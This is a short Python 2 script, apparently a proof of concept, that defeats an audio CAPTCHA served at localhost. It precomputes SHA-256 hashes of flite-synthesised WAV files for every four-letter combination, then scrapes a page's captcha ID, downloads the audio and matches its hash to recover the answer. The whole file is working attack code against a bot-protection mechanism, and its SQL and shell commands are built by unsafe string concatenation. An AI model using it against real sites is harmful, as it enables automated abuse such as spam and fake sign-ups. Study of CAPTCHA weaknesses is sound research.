#!/usr/bin/python2

import bs4
import hashlib
import itertools
import os
import sqlite3
import urllib2

def genDatabase():
	connection = sqlite3.connect('checksums.db')
	c = connection.cursor()
	c.execute('''CREATE TABLE IF NOT EXISTS checksums (checksum text, challenge text, UNIQUE(checksum, challenge));''')
	for challenge in itertools.product('ABCDEFGHIJKLMNOPQRSTUVWXYZ', repeat=4):
		string = ""
		filename = ""
		count = 1
		for letter in challenge:
			string += letter
			filename += letter
			count += 1
			if count <= 4:
				string += ", "
		# This allows us to stop the program by pressing CTRL-C twice
		if os.system("`which flite` -t \"" + string + "\" -o audio/" + filename + ".wav") != 0:
			print "Error"
			raw_input()
		file = open('audio/'+filename + '.wav', 'rb')
		data = file.read()
		sha256 = hashlib.sha256()
		sha256.update(data)
		c.execute('''INSERT OR IGNORE INTO checksums VALUES (\''''+sha256.hexdigest()+'''\',\''''+filename.split('.')[0]+'''\');''')
		os.remove('audio/' + filename + '.wav')
		print "Saved " + filename
	connection.commit()
	connection.close()

def getCaptcha(url):
	response = urllib2.urlopen(url)
	webpage = response.read()
	soup = bs4.BeautifulSoup(webpage, 'html.parser')
	value = "ERROR"
	for x in soup.find_all('input'):
		if x.get('id') == 'id_captcha_0':
			value = x.get('value')
			break

	if value == "ERROR":
		print "Could not find captcha link"
		exit(1)

	audiolink = url + '/captcha/audio/' + value + '.wav'
	response = urllib2.urlopen(audiolink)
	audio = response.read()
	sha256 = hashlib.sha256()
	sha256.update(audio)
	connection = sqlite3.connect('checksums.db')
	c = connection.cursor()
	c.execute('''SELECT challenge FROM checksums WHERE checksum = "''' + sha256.hexdigest() + '''";''')
	result = c.fetchone()
	if result is not None:
		print result[0]
	else:
		print "Could not find the checksum of this CAPTCHA in our database"
	connection.commit()
	connection.close()

#genDatabase()
getCaptcha('http://localhost:8000')
